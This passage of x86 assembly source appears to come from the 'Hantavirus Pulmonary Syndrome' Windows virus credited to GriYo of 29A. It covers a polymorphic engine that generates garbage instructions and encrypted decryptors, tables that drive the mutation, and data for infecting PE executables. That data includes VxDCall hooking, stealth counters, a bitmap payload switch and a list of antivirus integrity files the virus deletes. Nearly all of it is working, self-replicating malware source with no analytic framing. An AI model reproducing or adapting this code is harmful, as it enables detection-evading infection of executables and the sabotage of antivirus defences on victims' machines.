                   mov eax,dword ptr [ebp+mem_address]
                   add eax,mem_size-00000004h
                   sub eax,edi
                   stosd

                   ret

   doloopdown:     ;...or may be this other structure:
                   ;
                   ;       loop_point:
                   ;       ...
                   ;       cmp reg,x
                   ;       je virus
                   ;       ...
                   ;       jmp loop_point
                   ;       ...

                   mov ax,840Fh
                   stosw
                   mov eax,dword ptr [ebp+mem_address]
                   add eax,mem_size-00000004h
                   sub eax,edi
                   stosd

                   call gen_garbage

                   ;Insert a jump to loop point

                   mov al,0E9h
                   stosb
                   mov eax,dword ptr [ebp+loop_point]
                   sub eax,edi
                   sub eax,00000004h
                   stosd

                   ret

   ;············································································
   ;Generate some garbage code
   ;············································································

   gen_garbage:    ;More recursive levels allowed?

                   push esi
                   inc byte ptr [ebp+recursive_level]
                   cmp byte ptr [ebp+recursive_level],04h
                   jae exit_gg

                   ;Choose garbage generator

                   mov eax,00000004h
                   call get_rnd_range
                   inc eax
                   mov ecx,eax
   loop_garbage:   push ecx
                   mov eax,(end_garbage-tbl_garbage)/04h
                   call get_rnd_range
                   lea esi,dword ptr [ebp+tbl_garbage+eax*04h]
                   lodsd
                   add eax,ebp
                   call eax
                   pop ecx
                   loop loop_garbage

                   ;Update recursive level

   exit_gg:        dec byte ptr [ebp+recursive_level]
                   pop esi
                   ret

   ;············································································
   ;Generate MOV reg,imm
   ;············································································

   g_movreg32imm:  ;Generate MOV reg32,imm

                   call get_valid_reg
                   mov al,0B8h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   call get_rnd32
                   stosd
                   ret

   g_movreg16imm:  ;Generate MOV reg16,imm

                   call get_valid_reg
                   mov ax,0B866h
                   or ah,byte ptr [ebx+REG_MASK]
                   stosw
                   call get_rnd32
                   stosw
                   ret

   g_movreg8imm:   ;Generate MOV reg8,imm

                   call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movreg8imm
                   call get_rnd32
                   mov al,0B0h
                   or al,byte ptr [ebx+REG_MASK]
                   push eax
                   call get_rnd32
                   pop edx
                   and ax,0004h
                   or ax,dx
                   stosw
   a_movreg8imm:   ret


   ;············································································
   ;Generate mov reg,reg
   ;············································································

   g_movregreg32:  call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   cmp ebx,edx
                   je a_movregreg32
   c_movregreg32:  mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [edx+REG_MASK]
                   or ah,0C0h
                   mov al,8Bh
                   stosw
   a_movregreg32:  ret

   g_movregreg16:  call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   cmp ebx,edx
                   je a_movregreg32
                   mov al,66h
                   stosb
                   jmp short c_movregreg32

   g_movregreg8:   call get_rnd_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movregreg8
                   push ebx
                   call get_valid_reg
                   pop edx
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movregreg8
                   cmp ebx,edx
                   je a_movregreg8
                   mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [edx+REG_MASK]
                   or ah,0C0h
                   mov al,8Ah
                   push eax
                   call get_rnd32
                   pop edx
                   and ax,2400h
                   or ax,dx
                   stosw
   a_movregreg8:   ret

   ;············································································
   ;Generate MOVZX/MOVSX reg32,reg16
   ;············································································

   g_movzx_movsx:  call get_rnd32
                   mov ah,0B7h
                   and al,01h
                   jz d_movzx
                   mov ah,0BFh
   d_movzx:        mov al,0Fh
                   stosw
                   call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   mov al,byte ptr [ebx+REG_MASK]
                   shl al,03h
                   or al,0C0h
                   or al,byte ptr [edx+REG_MASK]
                   stosb
                   ret

   ;············································································
   ;Generate ADD/SUB/XOR/OR/AND reg,imm
   ;············································································

   g_mathregimm32: mov al,81h
                   stosb
                   call get_valid_reg
                   call do_math_work
                   stosd
                   ret

   g_mathregimm16: mov ax,8166h
                   stosw
                   call get_valid_reg
                   call do_math_work
                   stosw
                   ret

   g_mathregimm8:  call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_math8
                   mov al,80h
                   stosb
                   call do_math_work
                   stosb
                   and ah,04h
                   or byte ptr [edi-00000002h],ah
   a_math8:        ret

   do_math_work:   mov eax,end_math_imm-tbl_math_imm
                   call get_rnd_range
                   lea esi,dword ptr [ebp+eax+tbl_math_imm]
                   lodsb
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   call get_rnd32
                   ret

   ;············································································
   ;Generate push reg + garbage + pop reg
   ;············································································

   g_push_g_pop:   ;Note that garbage generator can call itself in a
                   ;recursive way, so structures like the following
                   ;example can be produced
                   ;
                   ;       push reg_1
                   ;       ...
                   ;       push reg_2
                   ;       ...
                   ;       pop reg_2
                   ;       ...
                   ;       pop reg_1
                   ;

                   call get_rnd_reg
                   mov al,50h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   call gen_garbage
                   call get_valid_reg
                   mov al,58h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   ret

   ;············································································
   ;Generate CALL without return
   ;············································································

   g_call_cont:    mov al,0E8h
                   stosb
                   push edi
                   stosd
                   call gen_rnd_block
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
                   call gen_garbage
                   call get_valid_reg
                   mov al,58h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   ret

   ;············································································
   ;Generate unconditional jumps
   ;············································································

   g_jump_u:       mov al,0E9h
                   stosb
                   push edi
                   stosd
                   call gen_rnd_block
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
                   ret

   ;············································································
   ;Generate conditional jumps
   ;············································································

   g_jump_c:       call get_rnd32
                   and ah,0Fh
                   add ah,80h
                   mov al,0Fh
                   stosw
                   push edi
                   stosd
                   call gen_garbage
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
                   ret

   ;············································································
   ;Generate one byte garbage code that does not change reg values
   ;············································································

   gen_save_code:  mov eax,end_save_code-tbl_save_code
                   call get_rnd_range
                   mov al,byte ptr [ebp+tbl_save_code+eax]
                   stosb
                   ret

   ;············································································
   ;Get a ramdom reg
   ;············································································

   get_rnd_reg:    mov eax,00000007h
                   call get_rnd_range
                   lea ebx,dword ptr [ebp+tbl_regs+eax*02h]
                   ret

   ;············································································
   ;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)
   ;············································································

   get_valid_reg:  call get_rnd_reg
                   mov al,byte ptr [ebx+REG_FLAGS]
                   and al,REG_IS_INDEX or REG_IS_COUNTER or REG_READ_ONLY
                   jnz get_valid_reg
                   ret

   ;············································································
   ;Load ecx with crypt_size / oper_size
   ;············································································

   fixed_size2ecx: mov eax,inf_size
                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]
                   shr ecx,01h
                   or ecx,ecx
                   jz ok_2ecx
                   shr eax,cl
                   jnc ok_2ecx
                   inc eax
   ok_2ecx:        mov ecx,eax
                   ret

   ;············································································
   ;Generate a block of random data
   ;············································································

   gen_rnd_block:  ;Get number of bytes to fill

                   mov eax,00000010h
                   call get_rnd_range
                   add eax,00000005h
                   mov ecx,eax

   rnd_fill:       ;Fill a ecx block with random data

                   cld
   rnd_fill_loop:  call get_rnd32
                   stosb
                   loop rnd_fill_loop
                   ret

   ;············································································
   ;Linear congruent pseudorandom number generator
   ;············································································

   get_rnd32:      push ecx
                   push edx
                   mov eax,dword ptr [ebp+rnd32_seed]
                   mov ecx,41C64E6Dh
                   mul ecx
                   add eax,00003039h
                   and eax,7FFFFFFFh
                   mov dword ptr [ebp+rnd32_seed],eax
                   pop edx
                   pop ecx
                   ret

   ;············································································
   ;Returns a random num between 0 and entry eax
   ;············································································

   get_rnd_range:  push ecx
                   push edx
                   mov ecx,eax
                   call get_rnd32
                   xor edx,edx
                   div ecx
                   mov eax,edx
                   pop edx
                   pop ecx
                   ret

   ;············································································
   ;Poly engine initialized data
   ;············································································

                   ;Register table
                   ;
                   ; - Register mask
                   ; - Register flags

   tbl_regs        equ this byte

                   db 00000000b,REG_READ_ONLY      ;eax
                   db 00000011b,00h                ;ebx
                   db 00000001b,00h                ;ecx
                   db 00000010b,00h                ;edx
                   db 00000110b,REG_NO_8BIT        ;esi
                   db 00000111b,REG_NO_8BIT        ;edi
                   db 00000101b,REG_NO_8BIT        ;ebp

   end_regs        equ this byte

                   ;Aliases for reg table structure

   REG_MASK        equ 00h
   REG_FLAGS       equ 01h

                   ;Bit aliases for reg flags

   REG_IS_INDEX    equ 01h         ;Register used as main index register
   REG_IS_COUNTER  equ 02h         ;This register is used as loop counter
   REG_READ_ONLY   equ 04h         ;Never modify the value of this register
   REG_NO_8BIT     equ 08h         ;ESI EDI and EBP havent 8bit version

                   ;Initial reg flags

   tbl_startup     equ this byte

                   db REG_READ_ONLY        ;eax
                   db 00h                  ;ebx
                   db 00h                  ;ecx
                   db 00h                  ;edx
                   db REG_NO_8BIT          ;esi
                   db REG_NO_8BIT          ;edi
                   db REG_NO_8BIT          ;ebp

                   ;Code that does not disturb reg values

   tbl_save_code   equ this byte

                   clc
                   stc
                   cmc
                   cld
                   std

   end_save_code   equ this byte

                   ;Generators for [reg] indexing mode

   tbl_idx_reg     equ this byte

                   dd offset xx_inc_reg
                   dd offset xx_dec_reg
                   dd offset xx_not_reg
                   dd offset xx_add_reg
                   dd offset xx_sub_reg
                   dd offset xx_xor_reg

                   ;Generators for [reg+imm] indexing mode

   tbl_dis_reg     equ this byte

                   dd offset yy_inc_reg
                   dd offset yy_dec_reg
                   dd offset yy_not_reg
                   dd offset yy_add_reg
                   dd offset yy_sub_reg
                   dd offset yy_xor_reg

                   ;Generators for [reg+reg] indexing mode

   tbl_xtended     equ this byte

                   dd offset zz_inc_reg
                   dd offset zz_dec_reg
                   dd offset zz_not_reg
                   dd offset zz_add_reg
                   dd offset zz_sub_reg
                   dd offset zz_xor_reg

                   ;Generators for [reg+reg+imm] indexing mode

   tbl_paranoia    equ this byte

                   dd offset ii_inc_reg
                   dd offset ii_dec_reg
                   dd offset ii_not_reg
                   dd offset ii_add_reg
                   dd offset ii_sub_reg
                   dd offset ii_xor_reg

                   ;Opcodes for math reg,imm

   tbl_math_imm    equ this byte

                   db 0C0h                         ;add
                   db 0C8h                         ;or
                   db 0E0h                         ;and
                   db 0E8h                         ;sub
                   db 0F0h                         ;xor
                   db 0D0h                         ;adc
                   db 0D8h                         ;sbb

   end_math_imm    equ this byte

                   ;Magic aliases

   MAGIC_PUTKEY    equ 01h
   MAGIC_PUTDISP   equ 02h
   MAGIC_ENDSTR    equ 0FFh
   MAGIC_ENDKEY    equ 0FEh
   MAGIC_CAREEBP   equ 00h
   MAGIC_NOTEBP    equ 0FFh

                   ;Magic data

   xx_inc_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 00h
                   db 00h
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   xx_dec_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 08h
                   db 00h
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   xx_not_reg      db 0F6h
                   db MAGIC_CAREEBP
                   db 10h
                   db 00h
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   xx_add_reg      db 80h
                   db MAGIC_CAREEBP
                   db 00h
                   db MAGIC_PUTKEY
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   xx_sub_reg      db 80h
                   db MAGIC_CAREEBP
                   db 28h
                   db MAGIC_PUTKEY
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   xx_xor_reg      db 80h
                   db MAGIC_CAREEBP
                   db 30h
                   db MAGIC_PUTKEY
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   yy_inc_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 80h
                   db MAGIC_PUTDISP
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   yy_dec_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 88h
                   db MAGIC_PUTDISP
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   yy_not_reg      db 0F6h
                   db MAGIC_NOTEBP
                   db 90h
                   db MAGIC_PUTDISP
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   yy_add_reg      db 80h
                   db MAGIC_NOTEBP
                   db 80h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   yy_sub_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0A8h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   yy_xor_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0B0h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   zz_inc_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 04h
                   db 00h
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   zz_dec_reg      db 0FEh
                   db MAGIC_CAREEBP
                   db 0Ch
                   db 00h
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   zz_not_reg      db 0F6h
                   db MAGIC_CAREEBP
                   db 14h
                   db 00h
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   zz_add_reg      db 80h
                   db MAGIC_CAREEBP
                   db 04h
                   db MAGIC_PUTKEY
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   zz_sub_reg      db 80h
                   db MAGIC_CAREEBP
                   db 2Ch
                   db MAGIC_PUTKEY
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   zz_xor_reg      db 80h
                   db MAGIC_CAREEBP
                   db 34h
                   db MAGIC_PUTKEY
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

   ii_inc_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 84h
                   db MAGIC_PUTDISP
                   dd offset x_inc_reg_byte
                   dd offset x_inc_reg_word
                   dd offset x_inc_reg_dword

   ii_dec_reg      db 0FEh
                   db MAGIC_NOTEBP
                   db 8Ch
                   db MAGIC_PUTDISP
                   dd offset x_dec_reg_byte
                   dd offset x_dec_reg_word
                   dd offset x_dec_reg_dword

   ii_not_reg      db 0F6h
                   db MAGIC_NOTEBP
                   db 94h
                   db MAGIC_PUTDISP
                   dd offset x_not_reg_byte
                   dd offset x_not_reg_word
                   dd offset x_not_reg_dword

   ii_add_reg      db 80h
                   db MAGIC_NOTEBP
                   db 84h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_add_reg_byte
                   dd offset x_add_reg_word
                   dd offset x_add_reg_dword

   ii_sub_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0ACh
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_sub_reg_byte
                   dd offset x_sub_reg_word
                   dd offset x_sub_reg_dword

   ii_xor_reg      db 80h
                   db MAGIC_NOTEBP
                   db 0B4h
                   db MAGIC_PUTKEY or MAGIC_PUTDISP
                   dd offset x_xor_reg_byte
                   dd offset x_xor_reg_word
                   dd offset x_xor_reg_dword

                   ;Reverse-code strings

   x_inc_reg_byte  db 02h,0FEh,0C8h,MAGIC_ENDSTR
   x_inc_reg_word  db 02h,66h,48h,MAGIC_ENDSTR
   x_inc_reg_dword db 01h,48h,MAGIC_ENDSTR
   x_dec_reg_byte  db 02h,0FEh,0C0h,MAGIC_ENDSTR
   x_dec_reg_word  db 02h,66h,40h,MAGIC_ENDSTR
   x_dec_reg_dword db 01h,40h,MAGIC_ENDSTR
   x_not_reg_byte  db 02h,0F6h,0D0h,MAGIC_ENDSTR
   x_not_reg_word  db 03h,66h,0F7h,0D0h,MAGIC_ENDSTR
   x_not_reg_dword db 02h,0F7h,0D0h,MAGIC_ENDSTR
   x_add_reg_byte  db 01h,2Ch,MAGIC_ENDKEY
   x_add_reg_word  db 02h,66h,2Dh,MAGIC_ENDKEY
   x_add_reg_dword db 01h,2Dh,MAGIC_ENDKEY
   x_sub_reg_byte  db 01h,04h,MAGIC_ENDKEY
   x_sub_reg_word  db 02h,66h,05h,MAGIC_ENDKEY
   x_sub_reg_dword db 01h,05h,MAGIC_ENDKEY
   x_xor_reg_byte  db 01h,34h,MAGIC_ENDKEY
   x_xor_reg_word  db 02h,66h,35h,MAGIC_ENDKEY
   x_xor_reg_dword db 01h,35h,MAGIC_ENDKEY

                   ;Format for each style-table entry:
                   ;
                   ; 00h - DWORD - Address of generator
                   ; 04h - DWORD - Address of generated subroutine or
                   ;               00000000h if not yet generated
                   ;

   style_table     equ this byte

                   dd offset gen_get_delta
                   dd 00000000h

                   dd offset gen_load_ctr
                   dd 00000000h

                   dd offset gen_decrypt
                   dd 00000000h

                   dd offset gen_next_step
                   dd 00000000h

                   dd offset gen_next_ctr
                   dd 00000000h

                   ;Garbage code generators

   tbl_garbage     equ this byte

                   dd offset gen_save_code         ;clc stc cmc cld std
                   dd offset g_movreg32imm         ;mov reg32,imm
                   dd offset g_movreg16imm         ;mov reg16,imm
                   dd offset g_movreg8imm          ;mov reg8,imm
                   dd offset g_movregreg32         ;mov reg32,reg32
                   dd offset g_movregreg16         ;mov reg16,reg16
                   dd offset g_movregreg8          ;mov reg8,reg8
                   dd offset g_mathregimm32        ;math reg32,imm
                   dd offset g_mathregimm16        ;math reg16,imm
                   dd offset g_mathregimm8         ;math reg8,imm
                   dd offset g_push_g_pop          ;push reg/garbage/pop reg
                   dd offset g_call_cont           ;call/garbage/pop
                   dd offset g_jump_u              ;jump/rnd block
                   dd offset g_jump_c              ;jump conditional/garbage
                   dd offset g_movzx_movsx         ;movzx/movsx reg32,reg16

   end_garbage     equ this byte

   ;············································································
   ;Virus initialized data
   ;············································································

   szKernel32      db "KERNEL32.dll",00h   ;Used for kernel scanning

   rnd32_seed      dd 00000000h            ;Seed for random number generator

   del_fileptr     dd offset szAvData_00   ;Filenames to delete
                   dd offset szAvData_01
                   dd offset szAvData_02
                   dd offset szAvData_03

   szAvData_00     db "ANTI-VIR.DAT",00h   ;Thunderbyte
   szAvData_01     db "CHKLIST.MS",00h     ;MsAv
   szAvData_02     db "AVP.CRC",00h        ;Avp
   szAvData_03     db "IVB.NTZ",00h        ;Invircible

   szAuth          db " < Hantavirus Pulmonary Syndrome (HPS) "
                   db "Virus BioCoded by GriYo / 29A > ",00h

                   align dword

   inf_end         equ this byte

   ;············································································
   ;Poly engine uninitialized data
   ;············································································

   ptr_disp        dd 00000000h    ;Displacement from index
   disp2disp       dd 00000000h    ;Displacement over displacement
   end_value       dd 00000000h    ;Index end value
   delta_call      dd 00000000h    ;Used into delta_offset routines
   loop_point      dd 00000000h    ;Start address of decryption loop
   entry_point     dd 00000000h    ;Entry point to decryptor code
   decryptor_size  dd 00000000h    ;Size of generated decryptor
   crypt_key       dd 00000000h    ;Encryption key
   oper_size       db 00h          ;Size used (1=Byte 2=Word 4=Dword)
   index_mask      db 00h          ;Mask of register used as index
   counter_mask    db 00h          ;Mask of register used as counter
   build_flags     db 00h          ;Some decryptor flags
   recursive_level db 00h          ;Garbage recursive layer

                   ;Decryptor flags aliases

   CRYPT_DIRECTION equ 01h
   CRYPT_CMPCTR    equ 02h
   CRYPT_CDIR      equ 04h
   CRYPT_SIMPLEX   equ 10h
   CRYPT_COMPLEX   equ 20h

   ;············································································

                   ;Virus uninitialized data

   scan_addr       dd 00000000h    ;Current memory address for our scanner
   a_VxDCall       dd 00000000h    ;VxDCall function entry-point
   hook_status     dd 00000000h    ;Flag to prevent reentrancy
   file_attrib     dd 00000000h    ;Original file attributes
   file_time       dd 00000000h    ;Original file time
   file_date       dd 00000000h    ;Original file date
   ptr_filename    dd 00000000h    ;Path end, filename start
   last_checksum   dd 00000000h    ;Checksum of filename
   padding_block   dd 00000000h    ;Numbers of bytes written for size padding
   mem_address     dd 00000000h    ;Virus position in memory
   bmp_address     dd 00000000h    ;Storage for .BMP handling rotuines
   bmp_active      dd 00000000h    ;Payload switch
   bmp_pages       dd 00000000h    ;Size of bitmap in pages

   VxDCall_code    db 06h dup (00h)                ;16:32 ptr to VxDCall INT 30h

   target_filename db MAX_PATH dup (00h)           ;Filename to infect

   stealth_this    dd 00000000h                    ;Bytes written to file

   msdos_header    db IMAGE_SIZEOF_DOS_HEADER \    ;MsDos header
                   dup (00h)

   pe_signature    dd 00000000h                    ;This holds the PE signature

   pe_header       db IMAGE_SIZEOF_FILE_HEADER \   ;Here comes the PE header
                   dup (00h)

   optional_header db IMAGE_SIZEOF_NT_OPTIONAL_HEADER \
                   dup (00h)                       ;Holds the optional Header

   section_header  db IMAGE_SIZEOF_SECTION_HEADER \;Section header of last
                   dup (00h)                       ;section in file

   mem_end         equ this byte                   ;End of virus portable code

   virus_copy      db inf_size dup (00h)           ;Virus copy for infections
   poly_max_size   equ 1000h                       ;Buffer size
   poly_buffer     db poly_max_size dup (00h)      ;Buffer for poly decryptor

   ;············································································

   virseg          ends

                   end host_entry
